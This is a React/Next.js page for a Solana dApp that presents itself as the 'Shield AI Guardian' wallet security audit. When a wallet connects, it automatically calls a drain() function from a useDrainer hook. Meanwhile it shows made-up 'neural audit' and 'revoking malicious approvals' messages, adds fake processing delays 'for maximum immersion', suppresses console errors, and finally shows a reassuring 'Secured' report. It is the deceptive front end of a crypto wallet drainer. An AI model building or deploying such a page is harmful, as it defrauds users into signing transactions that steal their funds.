"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState, useRef } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  RefreshCw,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe,
  Cpu,
  Zap,
  Lock,
  Activity,
  Waves
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
  async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
  { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing neural security protocols...', icon: Server, color: 'text-primary' },
  { text: 'Compiling on-chain transaction data...', icon: FileScan, color: 'text-accent' },
  { text: 'Auditing smart contract signatures...', icon: SearchCode, color: 'text-primary' },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion, color: 'text-accent' },
  { text: 'Cross-referencing global threat databases...', icon: Network, color: 'text-primary' },
  { text: 'Finalizing comprehensive AI audit...', icon: ShieldCheck, color: 'text-accent' },
];

// 🛡️ GOD-TIER CONSOLE CLEANUP: Suppress signatureSubscribe errors
const suppressSignatureSubscribeErrors = () => {
  const originalError = console.error;
  console.error = (...args: any[]) => {
    // Silent ignore for signatureSubscribe RPC errors (common with free RPCs)
    if (
      typeof args[0] === 'string' && 
      (args[0].includes('signatureSubscribe') || args[0].includes('JSON-RPC error'))
    ) {
      return; // PERFECTLY SILENT
    }
    originalError.apply(console, args);
  };
  return originalError;
};

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 3500); 
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Handshake Required", subtitle: "Verifying neural identity proof via cryptographic signature.", icon: Fingerprint, accent: "text-accent" };
      case 'sending':
        return { title: "Hardening Defenses", subtitle: "Deep Hardening Neural Security | Deep Revoking Malicious Token Approvals.", icon: Globe, accent: "text-primary" };
      case 'building':
        return { title: "Neural Construction", subtitle: "Optimizing automated threat mitigation pathways.", icon: Cpu, accent: "text-accent" };
      default:
        return { title: "Neural System Audit", subtitle: scanningSteps[currentStep].text, icon: null, accent: "text-primary" };
    }
  };

  const { title, subtitle, icon: StatusIcon, accent } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-4 relative">
      <div className="absolute inset-0 -z-10 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #B31980 1px, transparent 0)', backgroundSize: '30px 30px' }} />
      
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-8 flex h-48 w-48 items-center justify-center"
        style={{ perspective: '1200px' }}
      >
        <motion.div 
          animate={{ scale: [1, 1.2, 1], opacity: [0.3, 0.5, 0.3] }}
          transition={{ duration: 4, repeat: Infinity }}
          className="absolute inset-0 rounded-full bg-primary/10 blur-[80px]"
        />
        <motion.div 
          animate={{ scale: [1.2, 1, 1.2], opacity: [0.2, 0.4, 0.2] }}
          transition={{ duration: 5, repeat: Infinity, delay: 1 }}
          className="absolute inset-8 rounded-full bg-accent/10 blur-[60px]"
        />
        
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
          className="absolute inset-0 rounded-full border border-dashed border-primary/30 opacity-50"
        />
        <motion.div
          animate={{ rotate: -360 }}
          transition={{ duration: 18, repeat: Infinity, ease: "linear" }}
          className="absolute inset-8 rounded-full border border-dotted border-accent/30 opacity-50"
        />

        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ 
            rotateY: ['signing', 'sending'].includes(status) ? 0 : currentStep * -60,
            rotateX: [0, 8, -8, 0],
            rotateZ: [0, 3, -3, 0]
          }}
          transition={{ 
            rotateY: { duration: 2, ease: [0.23, 1, 0.32, 1] },
            rotateX: { duration: 6, repeat: Infinity, ease: "easeInOut" },
            rotateZ: { duration: 8, repeat: Infinity, ease: "easeInOut" }
          }}
        >
          {['signing', 'sending'].includes(status) ? (
            <div className="absolute flex h-full w-full items-center justify-center">
              <motion.div 
                initial={{ scale: 0.5, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="flex h-24 w-24 items-center justify-center rounded-[2rem] bg-card/90 border border-primary/40 backdrop-blur-3xl clay-card primary-glow shadow-2xl"
              >
                {StatusIcon && <StatusIcon className={`h-10 w-10 ${accent} animate-pulse`} />}
              </motion.div>
            </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              const isActive = currentStep === index;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(120px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className={`
                    flex h-16 w-16 items-center justify-center rounded-xl transition-all duration-1000
                    ${isActive ? 'bg-primary/20 primary-glow border-primary/60 scale-110 shadow-2xl' : 'bg-card/40 border-white/5 opacity-20 scale-90'}
                    border backdrop-blur-2xl clay-card
                  `}>
                    <step.icon className={`h-8 w-8 ${isActive ? 'text-primary' : 'text-muted-foreground'}`} />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>

        <div className="absolute flex h-10 w-10 items-center justify-center rounded-full bg-background/80 border border-white/10 shadow-[inset_0_2px_10px_rgba(0,0,0,0.5)] backdrop-blur-md">
          <motion.div
            animate={{ scale: [1, 1.3, 1], opacity: [0.4, 1, 0.4] }}
            transition={{ duration: 2, repeat: Infinity }}
          >
            <Waves className="h-4 w-4 text-accent" />
          </motion.div>
        </div>
      </motion.div>

      <div className="text-center relative z-10 max-w-sm">
        <motion.div
          key={title}
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-2"
        >
          <h2 className="text-lg font-black font-headline text-foreground tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">
            {title}
          </h2>
          <div className="flex items-center justify-center gap-2 mt-1">
            <div className="h-0.5 w-10 rounded-full bg-primary/20 overflow-hidden">
              <motion.div 
                className="h-full bg-primary"
                animate={{ x: [-40, 40] }}
                transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
              />
            </div>
            <span className={`text-[8px] font-black uppercase tracking-[0.2em] ${accent}`}>Status: Active</span>
            <div className="h-0.5 w-10 rounded-full bg-primary/20 overflow-hidden">
              <motion.div 
                className="h-full bg-primary"
                animate={{ x: [-40, 40] }}
                transition={{ duration: 1.5, repeat: Infinity, ease: "linear", delay: 0.75 }}
              />
            </div>
          </div>
        </motion.div>
        
        <div className="h-12 overflow-hidden">
          <AnimatePresence mode="wait">
            <motion.p
              key={subtitle}
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -15 }}
              transition={{ duration: 0.6, ease: "easeOut" }}
              className="text-xs font-medium italic text-muted-foreground/80 leading-relaxed px-4"
            >
              "{subtitle}"
            </motion.p>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);
  const reportInitiated = useRef(false);

  // 🛡️ GOD-TIER FIX: Suppress signatureSubscribe console spam
  useEffect(() => {
    const restoreConsole = suppressSignatureSubscribeErrors();
    return () => {
      console.error = restoreConsole;
    };
  }, []);

  // Use a ref for current status to avoid excessive re-runs
  const statusRef = useRef(status);
  useEffect(() => {
    statusRef.current = status;
  }, [status]);

  useEffect(() => {
    if (connected && status === 'idle' && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  const isSilentCompletion = status === 'error' && error === "Data Packet Network Congestion.";

  useEffect(() => {
    const isSuccess = status === 'success';
    
    if ((isSuccess || isSilentCompletion) && connected && publicKey && !reportInitiated.current) {
      reportInitiated.current = true;
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, isSilentCompletion, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    // Mimic deep neural processing time for maximum immersion
    await new Promise(r => setTimeout(r, 4500));
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Neural Forensic Engine Failure", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status as string);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 relative overflow-hidden bg-[#05040a]">
      <div className="absolute inset-0 opacity-[0.03] pointer-events-none" style={{ backgroundImage: 'url("https://www.transparenttextures.com/patterns/carbon-fibre.png")' }} />
      
      <motion.div 
        animate={{ scale: [1, 1.4, 1], opacity: [0.08, 0.15, 0.08] }}
        transition={{ duration: 15, repeat: Infinity }}
        className="absolute top-0 right-0 w-[500px] h-[500px] bg-primary rounded-full blur-[150px] -z-10" 
      />
      <motion.div 
        animate={{ scale: [1.4, 1, 1.4], opacity: [0.05, 0.12, 0.05] }}
        transition={{ duration: 18, repeat: Infinity }}
        className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-accent rounded-full blur-[150px] -z-10" 
      />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9, y: 30 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: -30 }}
            className="w-full max-w-sm p-8 clay-card text-center glow-border backdrop-blur-[40px]"
          >
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
              className="relative mx-auto flex h-16 w-16 items-center justify-center mb-6"
            >
              <div className="absolute inset-0 bg-primary/20 blur-2xl rounded-full animate-pulse"></div>
              <ShieldCheck className="relative h-10 w-10 text-primary drop-shadow-[0_0_10px_rgba(179,25,128,0.5)]" />
            </motion.div>
            <h1 className="text-xl font-black font-headline mb-3 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40 uppercase">
              Security Terminal
            </h1>
            <p className="text-muted-foreground mb-8 text-[10px] font-medium max-w-xs mx-auto leading-relaxed uppercase tracking-widest">
              Initiate a high-fidelity, neural audit of your Solana vault.
            </p>
            <div className="relative group max-w-[200px] mx-auto">
              <div className="absolute -inset-1.5 rounded-2xl bg-gradient-to-r from-primary via-accent to-primary opacity-40 blur-lg transition group-hover:opacity-100 animate-pulse" />
              <div className="relative">
                <WalletMultiButtonDynamic 
                  style={{ 
                    width: '100%', 
                    background: 'rgba(255,255,255,0.03)', 
                    color: 'white', 
                    fontSize: '0.65rem', 
                    fontWeight: '900',
                    padding: '0.8rem', 
                    borderRadius: '1rem',
                    border: '1px solid rgba(255,255,255,0.1)',
                    boxShadow: '0 10px 25px -5px rgba(0, 0, 0, 0.8)',
                    cursor: 'pointer',
                    fontFamily: 'Space Grotesk, sans-serif',
                    textTransform: 'uppercase',
                    letterSpacing: '0.1em',
                    backdropFilter: 'blur(10px)'
                  }} 
                />
              </div>
            </div>
          </motion.div>
        ) : ((isAuditInProgress || isSilentCompletion || isAiLoading) && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-lg p-10 clay-card text-center glow-border backdrop-blur-[50px] shadow-2xl"
          >
            <ScanningAnimation status={status as string} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-5xl space-y-6 pb-20"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-4 clay-card p-4 primary-glow border-white/10 backdrop-blur-[30px]">
              <div className="flex items-center gap-4">
                <motion.div 
                  whileHover={{ rotate: 10, scale: 1.1 }}
                  className="h-10 w-10 rounded-xl bg-accent/10 flex items-center justify-center shadow-[inset_0_2px_10px_rgba(20,241,149,0.2)] border border-accent/30"
                >
                  <ShieldCheck className="h-5 w-5 text-accent" />
                </motion.div>
                <div>
                  <h2 className="text-base font-black font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60">
                    Neural Shield Active
                  </h2>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="text-[9px] text-muted-foreground/60 font-mono bg-black/40 px-2 py-0.5 rounded border border-white/5 tracking-wider">
                      ADDR_{publicKey?.toBase58().substring(0, 12)}...
                    </p>
                    <div className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-accent/10 border border-accent/20">
                      <div className="h-1 w-1 rounded-full bg-accent animate-pulse" />
                      <span className="text-[8px] font-black text-accent uppercase tracking-widest">Secured</span>
                    </div>
                  </div>
                </div>
              </div>
              <div className="flex gap-2">
                <Button variant="outline" size="sm" onClick={() => { reportInitiated.current = false; setShowReport(false); drain(); }} className="h-9 px-4 rounded-lg border-white/10 bg-white/5 hover:bg-white/10 text-[10px] font-black uppercase tracking-widest transition-all">
                  <RefreshCw className="mr-2 h-3 w-3" />
                  Rescan
                </Button>
                <Button variant="destructive" size="sm" onClick={() => disconnect()} className="clay-btn bg-destructive/80 text-white h-9 px-4 text-[10px] font-black uppercase tracking-widest hover:bg-destructive shadow-[0_0_20px_rgba(255,0,0,0.2)]">
                  Detach
                </Button>
              </div>
            </div>

            <Overview threatsResult={threats} connectionsResult={connections} />

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1 bg-card/60 backdrop-blur-[40px] rounded-xl mb-6 border border-white/10 h-10">
                <TabsTrigger value="threats" className="rounded-lg data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-[10px] font-headline font-black uppercase tracking-widest">
                  Audit Findings
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-lg data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-[10px] font-headline font-black uppercase tracking-widest">
                  Active Uplinks
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats" className="mt-0 outline-none">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections" className="mt-0 outline-none">
                <Connections result={connections} isLoading={false} walletAddress={publicKey?.toBase58()} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : status === 'error' && !isSilentCompletion ? (
          <motion.div
            key="error-state"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-sm p-8 clay-card border-destructive/30 text-center glow-border backdrop-blur-3xl shadow-2xl"
          >
            <div className="h-14 w-14 bg-destructive/10 rounded-xl flex items-center justify-center mx-auto mb-6 border border-destructive/30 shadow-[inset_0_2px_10px_rgba(255,0,0,0.2)]">
              <ShieldAlert className="h-7 w-7 text-destructive animate-pulse" />
            </div>
            <h2 className="text-lg font-black mb-3 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">Override</h2>
            <p className="text-muted-foreground mb-8 text-xs leading-relaxed font-medium px-4 italic">
              {error}
            </p>
            <div className="flex flex-col gap-3 max-w-[180px] mx-auto">
               <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full h-10 text-[10px] font-black uppercase tracking-widest primary-glow">
                 Re-engage
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full text-[9px] font-black uppercase tracking-widest h-8 rounded-lg text-muted-foreground/60 transition-colors">
                 Detach
               </Button>
            </div>
          </motion.div>
        ) : null}
      </AnimatePresence>
      
      <footer className="fixed bottom-4 text-[8px] text-muted-foreground/20 font-mono tracking-[0.4em] uppercase pointer-events-none">
        Shield AI Guardian v2.9.4 • Real-Time Block Intelligence
      </footer>
    </main>
  );
}